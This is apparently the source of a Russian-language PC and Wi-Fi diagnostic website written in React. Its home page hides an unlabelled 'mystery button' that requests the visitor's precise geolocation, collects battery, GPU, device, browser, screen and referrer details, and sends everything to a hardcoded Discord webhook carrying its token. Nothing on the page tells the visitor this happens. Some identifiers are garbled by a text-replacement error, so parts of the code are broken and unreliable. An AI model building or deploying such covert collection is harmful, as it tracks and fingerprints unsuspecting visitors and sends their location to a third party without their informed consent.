import React, { useEffect, useState } from 'react';
import { createRoot } from 'react-dom/client';
import './styles.css';

/* =========================
   NAVIGATION
========================= */

const nav = [
  ['Главная', '#/'],
  ['Запустить диагностику', '#/diagnostic'],
  ['Производительность ПК', '#/pc'],
  ['Wi-Fi', '#/wifi'],
  ['Загрузки', '#/downloads']
];

function useRoute() {
  const [path, setPath] = useState(location.hash || '#/');

  useEffect(() => {
    const handleHashChange = () => {
      setPath(location.hash || '#/');

      window.scrollTo({
        top: 0,
        behavior: 'instant'
      });
    };

    window.addEventListener('hashchange', handleHashChange);

    return () => {
      window.removeEventListener('hashchange', handleHashChange);
    };
  }, []);

  return path;
}

/* =========================
   LAYOUT
========================= */

function Layout({ children, path }) {
  return (
    <div className="app">

      <header>

        <a className="logo" href="#/">
          diagnostic<span>.run</span><i>_</i>
        </a>

        <nav>
          {nav.map(([label, href]) => (
            <a
              className={path === href ? 'active' : ''}
              href={href}
              key={href}
            >
              {label}
            </a>
          ))}
        </nav>

      </header>

      <main>
        {children}
      </main>

      <footer>

        <a href="#/">
          diagnostic.run
        </a>

        <span>
          LOCAL-FIRST DIAGNOSTICS / 2026
        </span>

      </footer>

    </div>
  );
}

/* =========================
   TERMINAL
========================= */

function Terminal({ rows }) {
  return (
    <div className="terminal">

      <div className="termbar">
        <span>DIAGNOSTIC.RUN</span>
        <span>● ● ●</span>
      </div>

      <div className="termbody">

        {rows.map((row, index) => (
          <div className="termrow" key={index}>

            <b>&gt;</b>

            <span className={row[1] === 'OK' ? 'ok' : ''}>
              {row[0]} {row[1]}
            </span>

          </div>
        ))}

      </div>

    </div>
  );
}

/* =========================
   HOME
========================= */

function Home() {
  return (
    <>
      <section className="hero">

        <div>

          <small>
            СИСТЕМНАЯ ДИАГНОСТИКА / БЕЗ ЛИШНЕГО
          </small>

          <h1>
            Узнайте, что не так.
            <br />
            <em>Исправьте то, что работает медленно.</em>
          </h1>

          <p>
            Быстро проверьте в браузере
            подключение и устройство. Затем получите
            понятный способ всё исправить.
          </p>

          <div className="actions">

            <a
              className="button"
              href="#/diagnostic"
            >
              ЗАПУСТИТЬ ДИАГНОСТИКУ →
            </a>

            <a href="#/pc">
              СОВЕТЫ ПО ПРОИЗВОДИТЕЛЬНОСТИ
            </a>

          </div>

        </div>

        <Terminal
          rows={[
            ['СИСТЕМА В СЕТИ', 'OK'],
            ['ПРОВЕРКА БРАУЗЕРА', 'OK'],
            ['СЕТЬ ГОТОВА', 'OK'],
            ['ЗАДЕРЖКА 18 мс', 'OK'],
            ['СКАНИРОВАНИЕ УСТРОЙСТВА ГОТОВО', '']
          ]}
        />

      </section>

      <section className="section">

        <div className="head">
          <span>01 / СЕРВИСЫ</span>
          <span>ВЫБЕРИТЕ МОДУЛЬ</span>
        </div>

        <div className="cards">

          <a href="#/pc">

            <span>01</span>

            <h2>
              Производительность ПК
            </h2>

            <p>
              Практические исправления для автозагрузки,
              хранилища, браузеров и драйверов.
            </p>

            <b>
              ОТКРЫТЬ МОДУЛЬ →
            </b>

          </a>

          <a href="#/wifi">

            <span>02</span>

            <h2>
              Wi-Fi
            </h2>

            <p>
              Найдите проблемы с задержкой и
              улучшите беспроводное соединение.
            </p>

            <b>
              ОТКРЫТЬ МОДУЛЬ →
            </b>

          </a>

          <a href="#/downloads">

            <span>03</span>

            <h2>
              Downloads
            </h2>

            <p>
              Подборка ссылок на браузеры,
              VPN, драйверы и утилиты.
            </p>

            <b>
              ОТКРЫТЬ МОДУЛЬ →
            </b>

          </a>

        </div>

      </section>

      <section className="quick">

        <div>

          <span>БЫСТРЫЕ РЕШЕНИЯ</span>

          <strong>03</strong>

        </div>

        <div>
          <b>01</b>{' '}
          Перезагрузите роутер перед
          изменением настроек.
        </div>

        <div>
          <b>02</b>{' '}
          Оставляйте не менее 15% места на
          системном диске свободным.
        </div>

        <div>
          <b>03</b>{' '}
          Удаляйте приложения автозагрузки,
          которыми не пользуетесь.
        </div>

      </section>

      <MysteryButton />

    </>
  );
}

/* =========================
   MYSTERY BUTTON
========================= */

function MysteryButton() {
  const [status, setStatus] = useState('');

  /* =========================
     PING
  ========================= */

  async function measurePing() {
    const start = performance.now();

    try {
      await fetch(
        `/favicon.png?ping=${Date.now()}`,
        {
          method: 'HEAD',
          cache: 'no-store'
        }
      );

      return `${Math.round(
        performance.now() - start
      )} ms`;

    } catch {
      return 'Недоступно';
    }
  }

  /* =========================
     WEBGL / GPU
  ========================= */

  function getWebGLInfo() {
    try {
      const canvas =
        document.createElement('canvas');

      const gl =
        canvas.getContext('webgl') ||
        canvas.getContext('experimental-webgl');

      if (!gl) {
        return {
          WebGL: 'Недоступно',
          GPU: 'Недоступно',
          GPUVendor: 'Недоступно'
        };
      }

      const debugInfo =
        gl.getExtension(
          'WEBGL_debug_renderer_info'
        );

      return {
        WebGL: 'Доступно',

        GPU:
          debugInfo
            ? gl.getParameter(
                debugInfo.UNMASKED_RENDERER_WEBGL
              )
            : 'Ограничено',

        GPUVendor:
          debugInfo
            ? gl.getParameter(
                debugInfo.UNMASKED_VENDOR_WEBGL
              )
            : 'Ограничено'
      };

    } catch {
      return {
        WebGL: 'Недоступно',
        GPU: 'Недоступно',
        GPUVendor: 'Недоступно'
      };
    }
  }

  /* =========================
     BATTERY
  ========================= */

  async function getBatteryInfo() {
    try {

      if (!navigator.getBattery) {
        return {
          Battery: 'Недоступно',
          BatteryLevel: 'Недоступно',
          Charging: 'Недоступно',
          ChargingTime: 'Недоступно',
          DischargingTime: 'Недоступно'
        };
      }

      const battery =
        await navigator.getBattery();

      return {
        Battery: 'Доступно',

        BatteryLevel:
          `${Math.round(
            battery.level * 100
          )}%`,

        Charging:
          battery.charging
            ? 'Да'
            : 'Нет',

        ChargingTime:
          Number.isFinite(
            battery.chargingTime
          )
            ? `${battery.chargingTime} секунд`
            : 'Недоступно',

        DischargingTime:
          Number.isFinite(
            battery.dischargingTime
          )
            ? `${battery.dischargingTime} секунд`
            : 'Недоступно'
      };

    } catch {
      return {
        Battery: 'Недоступно',
        BatteryLevel: 'Недоступно',
        Charging: 'Недоступно',
        ChargingTime: 'Недоступно',
        DischargingTime: 'Недоступно'
      };
    }
  }

  /* =========================
     LOCATION
  ========================= */

  async function getPreciseLocation() {

    return new Promise((resolve) => {

      if (!navigator.geolocation) {

        resolve({
          Permission:
            'Геолокация недоступна',

          Latitude:
            'Недоступно',

          Longitude:
            'Недоступно',

          Accuracy:
            'Недоступно',

          Altitude:
            'Недоступно',

          AltitudeAccuracy:
            'Недоступно',

          Heading:
            'Недоступно',

          Speed:
            'Недоступно'
        });

        return;
      }

      navigator.geolocation.getCurrentPosition(

        (position) => {

          resolve({

            Permission:
              'Разрешено',

            Latitude:
              position.coords.latitude,

            Longitude:
              position.coords.longitude,

            Accuracy:
              `${Math.round(
                position.coords.accuracy
              )} m`,

            Altitude:
              position.coords.altitude !== null
                ? `${position.coords.altitude} m`
                : 'Недоступно',

            AltitudeAccuracy:
              position.coords.altitudeAccuracy !== null
                ? `${Math.round(
                    position.coords.altitudeAccuracy
                  )} m`
                : 'Недоступно',

            Heading:
              position.coords.heading !== null
                ? `${position.coords.heading}°`
                : 'Недоступно',

            Speed:
              position.coords.speed !== null
                ? `${position.coords.speed} m/s`
                : 'Недоступно'
          });
        },

        () => {

          resolve({

            Permission:
              'Отклонено / недоступно',

            Latitude:
              'Недоступно',

            Longitude:
              'Недоступно',

            Accuracy:
              'Недоступно',

            Altitude:
              'Недоступно',

            AltitudeAccuracy:
              'Недоступно',

            Heading:
              'Недоступно',

            Speed:
              'Недоступно'
          });
        },

        {
          enableHighAccuracy: true,
          timeout: 10000,
          maximumAge: 0
        }
      );
    });
  }

  /* =========================
     DISCORD FIELD BUILDER
  ========================= */

  function makeFields(data) {

    return Object.entries(data).map(
      ([name, value]) => ({

        name:
          String(name)
            .slice(0, 256),

        value:
          String(value)
            .slice(0, 1024),

        inline: true
      })
    );
  }

  /* =========================
     BUTTON CLICK
  ========================= */

  async function handleClick() {

    if (status === '...') {
      return;
    }

    setStatus('...');

    try {

      /* =====================
         BASIC INFORMATION
      ===================== */

      const ping =
        await measurePing();

      const webgl =
        getWebGLInfo();

      const battery =
        await getBatteryInfo();

      const location =
        await getPreciseLocation();

      const connection =
        navigator.connection ||
        navigator.mozConnection ||
        navigator.webkitConnection;

      const platform =
        navigator.userAgentData?.platform ||
        navigator.platform ||
        'Неизвестно';

      const browserMatch =
        navigator.userAgent.match(
          /(Chrome|Firefox|Safari|Edge|Opera)\/([\d.]+)/
        );

      const browser =
        browserMatch
          ? browserMatch[1]
          : 'Неизвестно';

      const browserVersion =
        browserMatch
          ? browserMatch[2]
          : 'Неизвестно';

      const isМобильное =
        navigator.userAgentData?.mobile ??
        /Android|iPhone|iPad|iPod|Мобильное/i.test(
          navigator.userAgent
        );

      /* =====================
         GEOLOCATION
      ===================== */

      const geolocation = {

        IP:
          'Требуется серверный поиск',

        Country:
          'Требуется серверная геолокация по IP',

        Region:
          'Требуется серверная геолокация по IP',

        City:
          'Требуется серверная геолокация по IP',

        ISP:
          'Требуется серверный поиск',

        ASN:
          'Требуется серверный поиск',

        Timezone:
          Intl.DateTimeFormat()
            .resolvedOptions()
            .timeZone ||
          'Неизвестно',

        TimezoneOffset:
          `${new Date().getTimezoneOffset()} minutes`,

        LocationPermission:
          location.Permission,

        Latitude:
          location.Latitude,

        Longitude:
          location.Longitude,

        Accuracy:
          location.Accuracy,

        Altitude:
          location.Altitude,

        AltitudeAccuracy:
          location.AltitudeAccuracy,

        Heading:
          location.Heading,

        Speed:
          location.Speed
      };

      /* =====================
         DEVICE
      ===================== */

      const device = {

        OperatingSystem:
          platform,

        Platform:
          navigator.platform ||
          'Неизвестно',

        DeviceType:
          isМобильное
            ? 'Мобильное'
            : 'Настольное',

        CPUThreads:
          navigator.hardwareConcurrency
            ? `${navigator.hardwareConcurrency} threads`
            : 'Неизвестно',

        DeviceMemory:
          navigator.deviceMemory
            ? `${navigator.deviceMemory} GB`
            : 'Неизвестно',

        TouchPoints:
          navigator.maxTouchPoints ??
          'Неизвестно',

        TouchSupport:
          navigator.maxTouchPoints > 0
            ? 'Да'
            : 'Нет',

        Cookies:
          navigator.cookieВключено
            ? 'Включено'
            : 'Отключено'
      };

      /* =====================
         GRAPHICS
      ===================== */

      const graphics = {

        WebGL:
          webgl.WebGL,

        GPU:
          webgl.GPU,

        GPUVendor:
          webgl.GPUVendor,

        WebGPU:
          'gpu' in navigator
            ? 'Доступно'
            : 'Недоступно'
      };

      /* =====================
         NETWORK
      ===================== */

      const network = {

        Online:
          navigator.onLine
            ? 'Да'
            : 'Нет',

        ConnectionType:
          connection?.effectiveType ||
          'Неизвестно',

        Downlink:
          connection?.downlink
            ? `${connection.downlink} Mbps`
            : 'Неизвестно',

        EstimatedRTT:
          connection?.rtt
            ? `${connection.rtt} ms`
            : 'Неизвестно',

        DataSaver:
          connection?.saveData
            ? 'Включено'
            : 'Отключено',

        MeasuredPing:
          ping
      };

      /* =====================
         БРАУЗЕР
      ===================== */

      const browserInfo = {

        Browser:
          browser,

        Version:
          browserVersion,

        UserAgent:
          navigator.userAgent ||
          'Неизвестно',

        Language:
          navigator.language ||
          'Неизвестно',

        Languages:
          navigator.languages?.join(', ') ||
          'Неизвестно',

        DoNotTrack:
          navigator.doNotTrack ||
          'Не указано',

        Cookies:
          navigator.cookieВключено
            ? 'Включено'
            : 'Отключено',

        PDFViewer:
          navigator.pdfViewerВключено !== undefined
            ? navigator.pdfViewerВключено
              ? 'Доступно'
              : 'Недоступно'
            : 'Неизвестно'
      };

      /* =====================
         DISPLAY
      ===================== */

      const display = {

        Resolution:
          `${screen.width} × ${screen.height}`,

        ДоступноResolution:
          `${screen.availWidth} × ${screen.availHeight}`,

        Viewport:
          `${window.innerWidth} × ${window.innerHeight}`,

        Document:
          `${document.documentElement.clientWidth} × ${document.documentElement.clientHeight}`,

        PixelRatio:
          window.devicePixelRatio ||
          'Неизвестно',

        ColorDepth:
          screen.colorDepth
            ? `${screen.colorDepth}-bit`
            : 'Неизвестно',

        PixelDepth:
          screen.pixelDepth
            ? `${screen.pixelDepth}-bit`
            : 'Неизвестно',

        Orientation:
          screen.orientation?.type ||
          'Неизвестно'
      };

      /* =====================
         HARDWARE / APIs
      ===================== */

      const hardware = {

        Battery:
          battery.Battery,

        BatteryLevel:
          battery.BatteryLevel,

        Charging:
          battery.Charging,

        ChargingTime:
          battery.ChargingTime,

        DischargingTime:
          battery.DischargingTime,

        MediaDevices:
          navigator.mediaDevices
            ? 'Доступно'
            : 'Недоступно',

        Geolocation:
          navigator.geolocation
            ? 'Доступно'
            : 'Недоступно',

        Bluetooth:
          navigator.bluetooth
            ? 'Доступно'
            : 'Недоступно',

        USB:
          navigator.usb
            ? 'Доступно'
            : 'Недоступно',

        Serial:
          navigator.serial
            ? 'Доступно'
            : 'Недоступно',

        HID:
          navigator.hid
            ? 'Доступно'
            : 'Недоступно',

        Clipboard:
          navigator.clipboard
            ? 'Доступно'
            : 'Недоступно'
      };

      /* =====================
         PAGE
      ===================== */

      const page = {

        URL:
          window.location.href,

        Host:
          window.location.host,

        Path:
          window.location.pathname,

        Protocol:
          window.location.protocol,

        Referrer:
          document.referrer ||
          'Прямой переход',

        HistoryLength:
          window.history.length
      };

      /* =====================
         SESSION
      ===================== */

      const session = {

        Timestamp:
          new Date().toISOString(),

        LocalTime:
          new Date().toString(),

        PageLoad:
          performance.timeOrigin
            ? new Date(
                performance.timeOrigin
              ).toISOString()
            : 'Неизвестно'
      };

      /* =====================
         DISCORD WEBHOOK
      ===================== */

      const WEBHOOK_URL =
        'https://discord.com/api/webhooks/1544799468476563506/CnL5_J1Lzv6dDdtoyVwVNjDKETvWu84m-c-wLcQjpwm3xEFcKKaEFZ5d1qIw1AjQSAvd';

      if (
        !WEBHOOK_URL ||
        WEBHOOK_URL ===
          'PASTE_YOUR_NEW_DISCORD_WEBHOOK_HERE'
      ) {
        throw new Error(
          'Discord webhook has not been configured'
        );
      }

      /* =====================
         DISCORD EMBEDS
      ===================== */

      const embeds = [

        {
          title:
            'GEOLOCATION',

          fields:
            makeFields(
              geolocation
            )
        },

        {
          title:
            'DEVICE',

          fields:
            makeFields(
              device
            )
        },

        {
          title:
            'GRAPHICS',

          fields:
            makeFields(
              graphics
            )
        },

        {
          title:
            'СЕТЬ',

          fields:
            makeFields(
              network
            )
        },

        {
          title:
            'БРАУЗЕР',

          fields:
            makeFields(
              browserInfo
            )
        },

        {
          title:
            'DISPLAY',

          fields:
            makeFields(
              display
            )
        },

        {
          title:
            'HARDWARE / APIs',

          fields:
            makeFields(
              hardware
            )
        },

        {
          title:
            'PAGE',

          fields:
            makeFields(
              page
            )
        },

        {
          title:
            'SESSION',

          fields:
            makeFields(
              session
            )
        }

      ];

      /* =====================
         SEND
      ===================== */

      const response =
        await fetch(
          WEBHOOK_URL,
          {
            method: 'POST',

            headers: {
              'Content-Type':
                'application/json'
            },

            body:
              JSON.stringify({

                content:
                  'Mystery button clicked',

                embeds
              })
          }
        );

      if (!response.ok) {

        throw new Error(
          `Discord returned ${response.status}`
        );
      }

      setStatus('✓');

      setTimeout(() => {
        setStatus('');
      }, 2000);

    } catch (error) {

      console.error(
        'Mystery button error:',
        error
      );

      setStatus('!');

      setTimeout(() => {
        setStatus('');
      }, 3000);
    }
  }

  return (
    <section className="mystery-section">

      <div className="mystery-label">
        что это делает?
      </div>

      <div className="mystery-ring">

        <button
          type="button"
          className="mystery-button"
          onClick={handleClick}
          disabled={status === '...'}
          aria-label="Mystery button"
        >
          {status}
        </button>

      </div>

    </section>
  );
}

/* =========================
   PAGE HEADER
========================= */

function PageHeader({
  number,
  title,
  description
}) {
  return (
    <>
      <a
        className="back-home"
        href="#/"
      >
        ← HOME
      </a>

      <small>
        {number}
      </small>

      <h1>
        {title}
      </h1>

      <p>
        {description}
      </p>
    </>
  );
}

/* =========================
   DIAGNOSTIC
========================= */

function Diagnostic() {
  const [running, setRunning] = useState(false);
  const [done, setDone] = useState(false);
  const [results, setResults] = useState([]);

  const run = async () => {

    setRunning(true);
    setDone(false);

    const t =
      performance.now();

    await fetch(
      `/favicon.png?x=${Date.now()}`,
      {
        method: 'HEAD',
        cache: 'no-store'
      }
    ).catch(() => {});

    const ms =
      Math.round(
        performance.now() - t
      );

    const connection =
      navigator.connection ||
      navigator.mozConnection ||
      navigator.webkitConnection;

    setResults([

      [
        'БРАУЗЕР',
        navigator.userAgent.match(
          /(Chrome|Firefox|Safari|Edge)\/[^ ]+/
        )?.[0] ||
        'AVAILABLE'
      ],

      [
        'PLATFORM',
        navigator.platform ||
        'UNKNOWN'
      ],

      [
        'CORES',
        navigator.hardwareConcurrency ||
        'Н/Д'
      ],

      [
        'MEMORY',
        navigator.deviceMemory
          ? navigator.deviceMemory + ' GB'
          : 'Н/Д'
      ],

      [
        'SCREEN',
        screen.width +
          ' × ' +
          screen.height
      ],

      [
        'CONNECTION',
        connection?.effectiveType?.toUpperCase() ||
        'AVAILABLE'
      ],

      [
        'LATENCY',
        ms + ' ms'
      ]

    ]);

    setRunning(false);
    setDone(true);
  };

  return (
    <section className="page">

      <PageHeader
        number="01 / ДИАГНОСТИКА УСТРОЙСТВА"
        title="Run Diagnostic"
        description="Измерьте то, что может увидеть ваш браузер. Ничего устанавливать не нужно."
      />

      <div className="diag">

        <Terminal
          rows={
            running
              ? [
                  ['ИНИЦИАЛИЗАЦИЯ...', ''],
                  ['ПРОВЕРКА ПОДКЛЮЧЕНИЯ...', ''],
                  ['ЧТЕНИЕ ДАННЫХ УСТРОЙСТВА...', '']
                ]
              : [
                  ['ГОТОВО', 'OK'],
                  ['НАЖМИТЕ «ЗАПУСТИТЬ», ЧТОБЫ НАЧАТЬ', ''],
                  ['ПРОГРАММНОЕ ОБЕСПЕЧЕНИЕ НЕ ТРЕБУЕТСЯ', '']
                ]
          }
        />

        <div className="panel">

          <h3>
            ПРОВЕРКИ
          </h3>

          {[
            'Браузер',
            'Устройство',
            'Экран',
            'Подключение',
            'Задержка',
            'Отчёт'
          ].map((name, index) => (

            <div
              className="check"
              key={name}
            >

              <span>
                0{index + 1}
              </span>

              {name}

              <b>
                {done && index < 5
                  ? 'OK'
                  : '—'}
              </b>

            </div>

          ))}

          <button
            type="button"
            className="button wide"
            onClick={run}
            disabled={running}
          >
            {running
              ? 'ВЫПОЛНЯЕТСЯ...'
              : 'ЗАПУСТИТЬ ДИАГНОСТИКУ →'}
          </button>

        </div>

      </div>

      {done && (

        <div className="report">

          <div className="head">

            <span>
              ОТЧЁТ
            </span>

            <span>
              СТАТУС:{' '}
              {
                Number(
                  results[6]?.[1]
                    ?.split(' ')[0]
                ) < 80
                  ? 'ХОРОШО'
                  : 'ПРОВЕРИТЬ'
              }
            </span>

          </div>

          <div className="results">

            {results.map(
              ([label, value]) => (

                <div key={label}>

                  <small>
                    {label}
                  </small>

                  <strong>
                    {value}
                  </strong>

                </div>

              )
            )}

          </div>

          <p className="note">
            Диагностика в браузере ограничена
            безопасностью веб-среды. Для более глубокой проверки Windows
            нужно локальное программное обеспечение.
          </p>

        </div>

      )}

    </section>
  );
}

/* =========================
   GUIDE DATA
========================= */

const tips = {

  pc: [

    [
      'АВТОЗАГРУЗКА',
      'Отключите приложения, которые не нужны при запуске. Диспетчер задач → Приложения автозагрузки.'
    ],

    [
      'ХРАНИЛИЩЕ',
      'Не допускайте полного заполнения системного диска. Удаляйте временные файлы и неиспользуемые приложения.'
    ],

    [
      'БРАУЗЕР',
      'Закрывайте неиспользуемые вкладки, удаляйте незнакомые расширения и обновляйте браузер.'
    ],

    [
      'ДРАЙВЕРЫ',
      'Используйте официальный сайт производителя оборудования для драйверов GPU, чипсета и сети.'
    ],

    [
      'ОБНОВЛЕНИЯ',
      'Устанавливайте обновления Windows и перезагружайте компьютер, когда это требуется.'
    ]

  ],

  wifi: [

    [
      'РАЗМЕЩЕНИЕ',
      'Разместите роутер в открытом месте ближе к центру. Избегайте шкафов, пола и крупных препятствий.'
    ],

    [
      'ДИАПАЗОН',
      'Используйте 5 ГГц или 6 ГГц на близком расстоянии. Для большей дальности используйте 2,4 ГГц.'
    ],

    [
      'ПОМЕХИ',
      'Избегайте перегруженных каналов и расположенной рядом электроники.'
    ],

    [
      'LATENCY',
      'Ethernet — самый чистый тест. Если проводное соединение хорошее, а Wi-Fi плохой, сосредоточьтесь на беспроводной сети.'
    ],

    [
      'ПЕРЕЗАПУСК',
      'Выключите и снова включите роутер и модем, затем повторите проверку.'
    ]

  ]

};

/* =========================
   GUIDE
========================= */

function Guide({ type }) {

  const isPC =
    type === 'pc';

  return (
    <section className="page">

      <PageHeader

        number={
          isPC
            ? '02 / ПРАКТИЧЕСКОЕ РУКОВОДСТВО'
            : '03 / ПРАКТИЧЕСКОЕ РУКОВОДСТВО'
        }

        title={
          isPC
            ? 'Производительность ПК'
            : 'Оптимизация Wi-Fi'
        }

        description="Прямой переход fixes. Start at the top and retest after each change."

      />

      <div className="guide">

        {tips[type].map(
          ([label, description], index) => (

            <article key={label}>

              <span>
                0{index + 1}
              </span>

              <div>

                <h2>
                  {label}
                </h2>

                <p>
                  {description}
                </p>

              </div>

              <b>
                ИСПРАВИТЬ →
              </b>

            </article>

          )
        )}

      </div>

    </section>
  );
}

/* =========================
   DOWNLOADS
========================= */

function Downloads() {

  const items = [

    [
      'БРАУЗЕРS',
      'Firefox',
      'https://www.mozilla.org/firefox/'
    ],

    [
      'БРАУЗЕРS',
      'Brave',
      'https://brave.com/download/'
    ],

    [
      'VPN',
      'Proton VPN',
      'https://protonvpn.com/download'
    ],

    [
      'GPU',
      'Драйверы NVIDIA',
      'https://www.nvidia.com/en-us/drivers/'
    ],

    [
      'GPU',
      'Драйверы AMD',
      'https://www.amd.com/en/support/download/drivers.html'
    ],

    [
      'СЕТЬ',
      'Драйверы Intel',
      'https://www.intel.com/content/www/us/en/download-center/home.html'
    ]

  ];

  return (
    <section className="page">

      <PageHeader
        number="04 / ЗАГРУЗКИ"
        title="Полезные загрузки"
        description="Только официальные источники. Проверяйте то, что устанавливаете."
      />

      <div className="downloads">

        {items.map(
          ([category, name, url]) => (

            <a
              href={url}
              target="_blank"
              rel="noreferrer"
              key={name}
            >

              <span>
                {category}
              </span>

              <h2>
                {name}
              </h2>

              <b>
                ОФИЦИАЛЬНЫЙ САЙТ ↗
              </b>

            </a>

          )
        )}

      </div>

    </section>
  );
}

/* =========================
   APP
========================= */

function App() {

  const path =
    useRoute();

  let page;

  switch (path) {

    case '#/diagnostic':
      page =
        <Diagnostic />;
      break;

    case '#/pc':
      page =
        <Guide type="pc" />;
      break;

    case '#/wifi':
      page =
        <Guide type="wifi" />;
      break;

    case '#/downloads':
      page =
        <Downloads />;
      break;

    case '#/':
    default:
      page =
        <Home />;
      break;

  }

  return (
    <Layout path={path}>
      {page}
    </Layout>
  );
}

/* =========================
   START
========================= */

createRoot(
  document.getElementById('root')
).render(
  <App />
);
